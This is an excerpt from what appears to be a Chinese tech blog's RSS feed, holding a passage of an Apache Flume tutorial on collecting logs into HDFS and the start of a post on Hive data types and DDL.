class="line-numbers-rows"><span></span></span></code></pre><p>（3）创建Flume Agent配置文件flume-netcat-logger.conf</p><p>（4）在flume目录下创建job文件夹并进入job文件夹。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> job<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">cd</span> job/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（5）在job文件夹下创建Flume Agent配置文件flume-netcat-logger.conf。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ vim flume-netcat-logger.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（6）在flume-netcat-logger.conf文件中添加如下内容。</p><p>添加内容如下：</p><pre class="line-numbers language-sh"><code class="language-sh"># Name the components on this agenta1.sources = r1a1.sinks = k1a1.channels = c1# Describe/configure the sourcea1.sources.r1.type = netcata1.sources.r1.bind = localhosta1.sources.r1.port = 44444# Describe the sinka1.sinks.k1.type = logger# Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1a1.sinks.k1.channel = c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：配置文件来源于官方手册<a href="http://flume.apache.org/FlumeUserGuide.html">http://flume.apache.org/FlumeUserGuide.html</a></p><p><img src="/2020/11/15/bigdata-flume1-setup/1637055240301.png" alt="1637055240301"></p><p>（7）先开启flume监听端口</p><p>第一种写法：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a1 --conf-file job/flume-netcat-logger.conf -Dflume.root.logger<span class="token operator">=</span>INFO,console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二种写法：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent -c conf/ -n a1 -f job/flume-netcat-logger.conf -Dflume.root.logger<span class="token operator">=</span>INFO,console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数说明：</p><p>​    –conf/-c：表示配置文件存储在conf/目录</p><p>​    –name/-n：表示给agent起名为a1</p><p>​    –conf-file/-f：flume本次启动读取的配置文件是在job文件夹下的flume-telnet.conf文件。</p><p>​    -Dflume.root.logger=INFO,console ：-D表示flume运行时动态修改flume.root.logger参数属性值，并将控制台日志打印级别设置为INFO级别。日志级别包括:log、info、warn、error。</p><p>（8）使用netcat工具向本机的44444端口发送内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ nc localhost 44444hello molly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（9）在Flume监听页面观察接收数据情况</p><p>思考：nc hadoop102 44444，flume能否接收到？</p><h3 id="2-2-2-实时监控单个追加文件"><a href="#2-2-2-实时监控单个追加文件" class="headerlink" title="2.2.2 实时监控单个追加文件"></a>2.2.2 实时监控单个追加文件</h3><p>1）案例需求：实时监控Hive日志，并上传到HDFS中</p><p>2）需求分析：         source类型：exec source  </p><p><img src="/2020/11/15/bigdata-flume1-setup/1637059514026.png" alt="1637059514026"></p><p>3）实现步骤：</p><p>（1）Flume要想将数据输出到HDFS，依赖Hadoop相关jar包</p><p>检查/etc/profile.d/my_env.sh文件，确认Hadoop和Java环境变量配置正确</p><pre class="line-numbers language-sh"><code class="language-sh">JAVA_HOME=/opt/module/jdk1.8.0_212HADOOP_HOME=/opt/module/ha/hadoop-3.1.3PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin:$HADOOP_HOME/sbinexport PATH JAVA_HOME HADOOP_HOME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（2）创建flume-file-hdfs.conf文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ vim flume-file-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：要想读取Linux系统中的文件，就得按照Linux命令的规则执行命令。由于Hive日志在Linux系统中所以读取文件的类型选择：exec即execute执行的意思。表示执行Linux命令来读取文件。</p><p>添加如下内容</p><pre class="line-numbers language-sh"><code class="language-sh"># Name the components on this agenta2.sources = r2a2.sinks = k2a2.channels = c2# Describe/configure the sourcea2.sources.r2.type = execa2.sources.r2.command = tail -F /opt/module/hive/logs/hive.log# Describe the sinka2.sinks.k2.type = hdfs# hdfs类型的sinka2.sinks.k2.hdfs.path = hdfs://hadoop102:8020/flume/%Y%m%d/%H#上传到hdfs#上传文件的前缀a2.sinks.k2.hdfs.filePrefix = logs-#是否按照时间滚动文件夹  #按照时间写入不同给的文件中a2.sinks.k2.hdfs.round = true#多少时间单位创建一个新的文件夹a2.sinks.k2.hdfs.roundValue = 1#重新定义时间单位a2.sinks.k2.hdfs.roundUnit = hour#是否使用本地时间戳a2.sinks.k2.hdfs.useLocalTimeStamp = true#积攒多少个Event才flush到HDFS一次a2.sinks.k2.hdfs.batchSize = 100#设置文件类型，可支持压缩a2.sinks.k2.hdfs.fileType = DataStream#多久生成一个新的文件a2.sinks.k2.hdfs.rollInterval = 60#设置每个文件的滚动大小a2.sinks.k2.hdfs.rollSize = 134217700#文件的滚动与Event数量无关a2.sinks.k2.hdfs.rollCount = 0# Use a channel which buffers events in memorya2.channels.c2.type = memorya2.channels.c2.capacity = 1000a2.channels.c2.transactionCapacity = 100# Bind the source and sink to the channela2.sources.r2.channels = c2a2.sinks.k2.channel = c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：</p><p>对于所有与时间相关的转义序列，Event Header中必须存在以 “timestamp”的key（除非hdfs.useLocalTimeStamp设置为true，此方法会使用TimestampInterceptor自动添加timestamp）。</p><p>a3.sinks.k3.hdfs.useLocalTimeStamp = true</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637059968136.png" alt="1637059968136"></p><p>（3）运行Flume</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a2 --conf-file job/flume-file-hdfs.conf  -Dflume.root.logger<span class="token operator">=</span>INFO,console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）开启Hadoop和Hive并操作Hive产生日志</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-2.7.2<span class="token punctuation">]</span>$ sbin/start-dfs.sh<span class="token punctuation">[</span>molly@hadoop103 hadoop-2.7.2<span class="token punctuation">]</span>$ sbin/start-yarn.sh<span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hivehive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（5）在HDFS上查看文件。</p><p>正在使用的文件的后缀是.tmp</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637062965508.png" alt="1637062965508"></p><h3 id="2-2-3-实时监控目录下多个新文件"><a href="#2-2-3-实时监控目录下多个新文件" class="headerlink" title="2.2.3 实时监控目录下多个新文件"></a>2.2.3 实时监控目录下多个新文件</h3><p>1）案例需求：使用Flume监听整个目录的新文件,<strong>有新文件</strong>出现，将新文件数据上传至HDFS</p><p>2）需求分析：</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637063102633.png" alt="1637063102633"></p><p>3）实现步骤：</p><p>（1）创建配置文件flume-dir-hdfs.conf</p><p>创建一个文件</p><p>[molly@hadoop102 job]$ vim flume-dir-hdfs.conf</p><p>添加如下内容</p><pre class="line-numbers language-bash"><code class="language-bash">a3.sources <span class="token operator">=</span> r3a3.sinks <span class="token operator">=</span> k3a3.channels <span class="token operator">=</span> c3<span class="token comment" spellcheck="true"># Describe/configure the source</span>a3.sources.r3.type <span class="token operator">=</span> spooldira3.sources.r3.spoolDir <span class="token operator">=</span> /opt/module/flume/upload  <span class="token comment" spellcheck="true">#监控的目录</span>a3.sources.r3.fileSuffix <span class="token operator">=</span> .COMPLETED <span class="token comment" spellcheck="true">#采集过的文件表示这个后缀；后面将不会对旧文件进行采集</span>a3.sources.r3.fileHeader <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#忽略所有以.tmp结尾的文件，不上传</span>a3.sources.r3.ignorePattern <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>^ <span class="token punctuation">]</span>*\.tmp<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Describe the sink</span>a3.sinks.k3.type <span class="token operator">=</span> hdfsa3.sinks.k3.hdfs.path <span class="token operator">=</span> hdfs://hadoop102:8020/flume/upload/%Y%m%d/%H<span class="token comment" spellcheck="true">#上传文件的前缀</span>a3.sinks.k3.hdfs.filePrefix <span class="token operator">=</span> upload-<span class="token comment" spellcheck="true">#是否按照时间滚动文件夹</span>a3.sinks.k3.hdfs.round <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#多少时间单位创建一个新的文件夹</span>a3.sinks.k3.hdfs.roundValue <span class="token operator">=</span> 1<span class="token comment" spellcheck="true">#重新定义时间单位</span>a3.sinks.k3.hdfs.roundUnit <span class="token operator">=</span> hour<span class="token comment" spellcheck="true">#是否使用本地时间戳</span>a3.sinks.k3.hdfs.useLocalTimeStamp <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#积攒多少个Event才flush到HDFS一次</span>a3.sinks.k3.hdfs.batchSize <span class="token operator">=</span> 100<span class="token comment" spellcheck="true">#设置文件类型，可支持压缩</span>a3.sinks.k3.hdfs.fileType <span class="token operator">=</span> DataStream<span class="token comment" spellcheck="true">#多久生成一个新的文件</span>a3.sinks.k3.hdfs.rollInterval <span class="token operator">=</span> 60<span class="token comment" spellcheck="true">#设置每个文件的滚动大小大概是128M</span>a3.sinks.k3.hdfs.rollSize <span class="token operator">=</span> 134217700<span class="token comment" spellcheck="true">#文件的滚动与Event数量无关</span>a3.sinks.k3.hdfs.rollCount <span class="token operator">=</span> 0<span class="token comment" spellcheck="true"># Use a channel which buffers events in memory</span>a3.channels.c3.type <span class="token operator">=</span> memorya3.channels.c3.capacity <span class="token operator">=</span> 1000a3.channels.c3.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a3.sources.r3.channels <span class="token operator">=</span> c3a3.sinks.k3.channel <span class="token operator">=</span> c3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/15/bigdata-flume1-setup/1637063607668.png" alt="1637063607668"></p><p>（2）启动监控文件夹命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a3 --conf-file job/flume-dir-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：在使用Spooling Directory Source时，不要在监控目录中创建并持续修改文件；上传完成的文件会以.COMPLETED结尾；被监控文件夹每500毫秒扫描一次文件变动。</p><p>（3）向upload文件夹中添加文件</p><p>在/opt/module/flume目录下创建upload文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> upload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>向upload文件夹中添加文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 upload<span class="token punctuation">]</span>$ <span class="token function">touch</span> molly.txt<span class="token punctuation">[</span>molly@hadoop102 upload<span class="token punctuation">]</span>$ <span class="token function">touch</span> molly.tmp<span class="token punctuation">[</span>molly@hadoop102 upload<span class="token punctuation">]</span>$ <span class="token function">touch</span> molly.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（4）查看HDFS上的数据</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637063370689.png" alt="1637063370689"></p><p>（5）查看采集后的文件，发现文件已经加了后缀COMPLETED</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637063420040.png" alt="1637063420040"></p><h3 id="2-2-4-实时监控目录下的多个追加文件"><a href="#2-2-4-实时监控目录下的多个追加文件" class="headerlink" title="2.2.4 实时监控目录下的多个追加文件"></a>2.2.4 实时监控目录下的多个追加文件</h3><p>Exec source适用于监控<strong>一个实时追加**</strong>的文件，不能实现断点续传；Spooldir Source适合用于同步新文件，但不适合对实时追加日志的文件进行监听并同步；而<strong>Taildir Source适合用于监听多个实时追加的文件</strong>，并且能够实现断点续传。</p><p>1）案例需求:使用Flume监听整个目录的实时追加文件，并上传至HDFS</p><p>2）需求分析:</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637063679839.png" alt="1637063679839"></p><p>3）实现步骤：</p><p>（1）创建配置文件flume-taildir-hdfs.conf</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ vim flume-taildir-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">a3.sources = r3a3.sinks = k3a3.channels = c3# Describe/configure the sourcea3.sources.r3.type = TAILDIRa3.sources.r3.positionFile = /opt/module/flume/tail_dir.json  #记录采集的位置 从而实现断点续传a3.sources.r3.filegroups = f1 f2  #监控的多个文件组a3.sources.r3.filegroups.f1 = /opt/module/flume/files/.*file.* #监控f1组的文件a3.sources.r3.filegroups.f2 = /opt/module/flume/files2/.*log.*# Describe the sinka3.sinks.k3.type = hdfsa3.sinks.k3.hdfs.path = hdfs://hadoop102:8020/flume/upload2/%Y%m%d/%H#上传文件的前缀a3.sinks.k3.hdfs.filePrefix = upload-#是否按照时间滚动文件夹a3.sinks.k3.hdfs.round = true#多少时间单位创建一个新的文件夹a3.sinks.k3.hdfs.roundValue = 1#重新定义时间单位a3.sinks.k3.hdfs.roundUnit = hour#是否使用本地时间戳a3.sinks.k3.hdfs.useLocalTimeStamp = true#积攒多少个Event才flush到HDFS一次a3.sinks.k3.hdfs.batchSize = 100#设置文件类型，可支持压缩a3.sinks.k3.hdfs.fileType = DataStream#多久生成一个新的文件a3.sinks.k3.hdfs.rollInterval = 60#设置每个文件的滚动大小大概是128Ma3.sinks.k3.hdfs.rollSize = 134217700#文件的滚动与Event数量无关a3.sinks.k3.hdfs.rollCount = 0# Use a channel which buffers events in memorya3.channels.c3.type = memorya3.channels.c3.capacity = 1000a3.channels.c3.transactionCapacity = 100# Bind the source and sink to the channela3.sources.r3.channels = c3a3.sinks.k3.channel = c3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/15/bigdata-flume1-setup/1637064020425.png" alt="1637064020425"></p><p>（2）启动监控文件夹命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a3 --conf-file job/flume-taildir-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）向files文件夹中追加内容</p><p>在/opt/module/flume目录下创建files文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>向upload文件夹中添加文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 files<span class="token punctuation">]</span>$ <span class="token keyword">echo</span> hello <span class="token operator">>></span> file1.txt<span class="token punctuation">[</span>molly@hadoop102 files<span class="token punctuation">]</span>$ <span class="token keyword">echo</span> molly <span class="token operator">>></span> file2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（4）查看HDFS上的数据</p><p><strong>（5）为啥Taildir可以断点续传？？</strong></p><p>  Taildir Source维护了一个json格式的position File，其会定期的往position File中更新每个文件读取到的最新的位置，因此能够实现断点续传。Position File的格式如下：</p><p>{“inode”:2496272,”pos”:12,”file”:”/opt/module/flume/files/file1.txt”}<br>{“inode”:2496275,”pos”:12,”file”:”/opt/module/flume/files/file2.txt”}</p><p>注：Linux中储存文件元数据的区域就叫做inode，每个inode都有一个号码，操作系统用inode号码来识别不同的文件，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/flume/">flume</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-flume1-setup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hive学习笔记（二） Hive对数据基本操作</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-hive2/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-hive2/</guid>
      <pubDate>Sun, 15 Nov 2020 07:45:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>下面我们通过Hive对数据进行操作，主要包括对数据库，表的基本操作和基本函数的使用。</p><h1 id="1-Hive数据类型"><a href="#1-Hive数据类型" class="headerlink" title="1   Hive数据类型"></a>1   Hive数据类型</h1><h2 id="1-1-基本数据类型"><a href="#1-1-基本数据类型" class="headerlink" title="1.1 基本数据类型"></a>1.1 基本数据类型</h2><table><thead><tr><th>Hive数据类型</th><th>Java数据类型</th><th>长度</th><th>例子</th></tr></thead><tbody><tr><td>TINYINT</td><td>byte</td><td>1byte有符号整数</td><td>20</td></tr><tr><td>SMALINT</td><td>short</td><td>2byte有符号整数</td><td>20</td></tr><tr><td>INT</td><td>int</td><td>4byte有符号整数</td><td>20</td></tr><tr><td>BIGINT</td><td>long</td><td>8byte有符号整数</td><td>20</td></tr><tr><td>BOOLEAN</td><td>boolean</td><td>布尔类型，true或者false</td><td>TRUE FALSE</td></tr><tr><td>FLOAT</td><td>float</td><td>单精度浮点数</td><td>3.14159</td></tr><tr><td>DOUBLE</td><td>double</td><td>双精度浮点数</td><td>3.14159</td></tr><tr><td>STRING</td><td>string</td><td>字符系列。可以指定字符集。可以使用单引号或者双引号。</td><td>‘now is the time’  “for all  good men”</td></tr><tr><td>TIMESTAMP</td><td></td><td>时间类型</td><td></td></tr><tr><td>BINARY</td><td></td><td>字节数组</td><td></td></tr></tbody></table><p>对于Hive的String类型相当于数据库的varchar类型，该类型是一个可变的字符串，不过它不能声明其中最多能存储多少个字符，理论上它可以存储2GB的字符数。</p><h2 id="1-2-集合数据类型"><a href="#1-2-集合数据类型" class="headerlink" title="1.2 集合数据类型"></a>1.2 集合数据类型</h2><table><thead><tr><th>数据类型</th><th>描述</th><th>语法示例</th></tr></thead><tbody><tr><td>STRUCT</td><td>和c语言中的struct类似，都可以通过“点”符号访问元素内容。例如，如果某个列的数据类型是STRUCT{first STRING, last STRING},那么第1个元素可以通过字段.first来引用。</td><td>struct()  例如struct&lt;street:string,  city:string&gt;</td></tr><tr><td>MAP</td><td>MAP是一组键-值对元组集合，使用数组表示法可以访问数据。例如，如果某个列的数据类型是MAP，其中键-&gt;值对是’first’-&gt;’John’和’last’-&gt;’Doe’，那么可以通过字段名[‘last’]获取最后一个元素</td><td>map()  例如map&lt;string,  int&gt;</td></tr><tr><td>ARRAY</td><td>数组是一组具有相同类型和名称的变量的集合。这些变量称为数组的元素，每个数组元素都有一个编号，编号从零开始。例如，数组值为[‘John’, ‘Doe’]，那么第2个元素可以通过数组名[1]进行引用。</td><td>Array()  例如array<string></string></td></tr></tbody></table><p>Hive有三种复杂数据类型ARRAY、MAP 和 STRUCT。ARRAY和MAP与Java中的Array和Map类似，而STRUCT与C语言中的Struct类似，它封装了一个命名字段集合，复杂数据类型允许任意层次的嵌套。</p><p>1）案例实操</p><p>（1）假设某表有如下一行，我们用JSON格式来表示其数据结构。在Hive下访问的格式为</p><pre class="line-numbers language-json"><code class="language-json">&amp;#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"songsong"</span><span class="token punctuation">,</span>  <span class="token property">"friends"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"bingbing"</span> <span class="token punctuation">,</span> <span class="token string">"lili"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span>    //列表Array<span class="token punctuation">,</span>   <span class="token property">"children"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>           //键值Map<span class="token punctuation">,</span>​    <span class="token property">"xiao song"</span><span class="token operator">:</span> <span class="token number">19</span> <span class="token punctuation">,</span>​    <span class="token property">"xiaoxiao song"</span><span class="token operator">:</span> <span class="token number">18</span>  &amp;#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token property">"address"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>           //结构Struct<span class="token punctuation">,</span>​    <span class="token property">"street"</span><span class="token operator">:</span> <span class="token string">"hui long guan"</span> <span class="token punctuation">,</span>​    <span class="token property">"city"</span><span class="token operator">:</span> <span class="token string">"beijing"</span>   &amp;#<span class="token number">125</span><span class="token punctuation">;</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）基于上述数据结构，我们在Hive里创建对应的表，并导入数据。 </p><p>创建本地测试文件test.txt</p><p>songsong,bingbing_lili,xiao song:18_xiaoxiao song:19,hui long guan_beijing</p><p>yangyang,caicai_susu,xiao yang:18_xiaoxiao yang:19,chao yang_beijing</p><p>注意：MAP，STRUCT和ARRAY里的元素间关系都可以用同一个字符表示，这里用“_”。</p><p>（3）Hive上创建测试表test</p><pre class="line-numbers language-bash"><code class="language-bash">create table test<span class="token punctuation">(</span>name string,friends array<span class="token operator">&lt;</span>string<span class="token operator">></span>,children map<span class="token operator">&lt;</span>string, int<span class="token operator">></span>,address struct<span class="token operator">&lt;</span>street:string, city:string<span class="token operator">></span><span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">','</span>collection items terminated by <span class="token string">'_'</span>map keys terminated by <span class="token string">':'</span>lines terminated by <span class="token string">'\n'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字段解释：</p><p>row format delimited fields terminated by ‘,’ – 列分隔符</p><p>collection items terminated by ‘_’    –MAP STRUCT 和 ARRAY 的分隔符(数据分割符号)</p><p>map keys terminated by ‘:’           – MAP中的key与value的分隔符</p><p>lines terminated by ‘\n’;             – 行分隔符</p><p>（4）导入文本数据到测试表</p><p>load data local inpath ‘/opt/module/hive/datas/test.txt’ into table test; </p><p>（5）访问三种集合列里的数据，以下分别是ARRAY，MAP，STRUCT的访问方式</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> friends<span class="token punctuation">[</span>1<span class="token punctuation">]</span>,children<span class="token punctuation">[</span><span class="token string">'xiao song'</span><span class="token punctuation">]</span>,address.city from <span class="token function">test</span>where name<span class="token operator">=</span><span class="token string">"songsong"</span><span class="token punctuation">;</span>OK_c0   _c1   citylili  18   beijingTime taken: 0.076 seconds, Fetched: 1 row<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-3-类型转化"><a href="#1-3-类型转化" class="headerlink" title="1.3 类型转化"></a>1.3 类型转化</h2><p>Hive的原子数据类型是可以进行隐式转换的，类似于Java的类型转换，例如某表达式使用INT类型，TINYINT会自动转换为INT类型，但是Hive不会进行反向转化，例如，某表达式使用TINYINT类型，INT不会自动转换为TINYINT类型，它会返回错误，除非使用CAST操作。</p><p>1）隐式类型转换规则如下</p><p>（1）任何整数类型都可以隐式地转换为一个范围更广的类型，如TINYINT可以转换成INT，INT可以转换成BIGINT。</p><p>（2）所有整数类型、FLOAT和STRING类型都可以隐式地转换成DOUBLE。</p><p>（3）TINYINT、SMALLINT、INT都可以转换为FLOAT。</p><p>（4）BOOLEAN类型不可以转换为任何其它的类型。</p><p>2）可以使用CAST操作显示进行数据类型转换</p><p>例如CAST(‘1’ AS INT)将把字符串’1’ 转换成整数1；如果强制类型转换失败，如执行CAST(‘X’ AS INT)，表达式返回空值 NULL。</p><pre class="line-numbers language-bash"><code class="language-bash">0: jdbc:hive2://hadoop102:10000<span class="token operator">></span> <span class="token keyword">select</span> <span class="token string">'1'</span>+2, cast<span class="token punctuation">(</span><span class="token string">'1'</span>as int<span class="token punctuation">)</span> + 2<span class="token punctuation">;</span>+------+------+--+<span class="token operator">|</span> _c0 <span class="token operator">|</span> _c1 <span class="token operator">|</span>+------+------+--+<span class="token operator">|</span> 3.0 <span class="token operator">|</span> 3  <span class="token operator">|</span>+------+------+--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2 DDL数据定义</p><h1 id="2-DDL数据定义"><a href="#2-DDL数据定义" class="headerlink" title="2 DDL数据定义"></a>2 DDL数据定义</h1><p>数据库模式定义语言DDL(Data Definition Language)，是用于描述数据库中要存储的现实世界实体的语言。具体其实就是对数据库和表的CRUD操作。</p><h2 id="2-1-创建数据库"><a href="#2-1-创建数据库" class="headerlink" title="2.1 创建数据库"></a>2.1 创建数据库</h2><p>创建数据库语法如下所示：</p><pre class="line-numbers language-bash"><code class="language-bash">CREATE DATABASE <span class="token punctuation">[</span>IF NOT EXISTS<span class="token punctuation">]</span> database_name  --数据库名称<span class="token punctuation">[</span>COMMENT database_comment<span class="token punctuation">]</span>  --数据库备注<span class="token punctuation">[</span>LOCATION hdfs_path<span class="token punctuation">]</span>  ---数据库存储位置<span class="token punctuation">[</span>WITH DBPROPERTIES <span class="token punctuation">(</span>property_name<span class="token operator">=</span>property_value, <span class="token punctuation">..</span>.<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> --DB的一些属性<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>1）创建一个数据库，数据库在HDFS上的默认存储路径是/user/hive/warehouse/*.db。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create datavase mydb<span class="token punctuation">;</span>create table <span class="token keyword">if</span> not exists test1<span class="token punctuation">(</span> <span class="token function">id</span> int comment <span class="token string">"this is id"</span>, name string comment <span class="token string">"this is name"</span><span class="token punctuation">)</span>comment <span class="token string">"this is table"</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">','</span>STORED as textfileTBLPROPERTIES<span class="token punctuation">(</span><span class="token string">"createtime="</span> 2020-4-11"<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以在hdfs上看到创建的数据库目录。</p><p><img src="/2020/11/15/bigdata-hive2/1636962952895.png" alt="1636962952898"></p><p>2）避免要创建的数据库已经存在错误，增加if not exists判断。（标准写法）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create database db_hive<span class="token punctuation">;</span>FAILED: Execution Error, <span class="token keyword">return</span> code 1 from org.apache.hadoop.hive.ql.exec.DDLTask. Database db_hive already existshive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create database <span class="token keyword">if</span> not exists db_hive<span class="token punctuation">;</span><span aria-hidden="true" 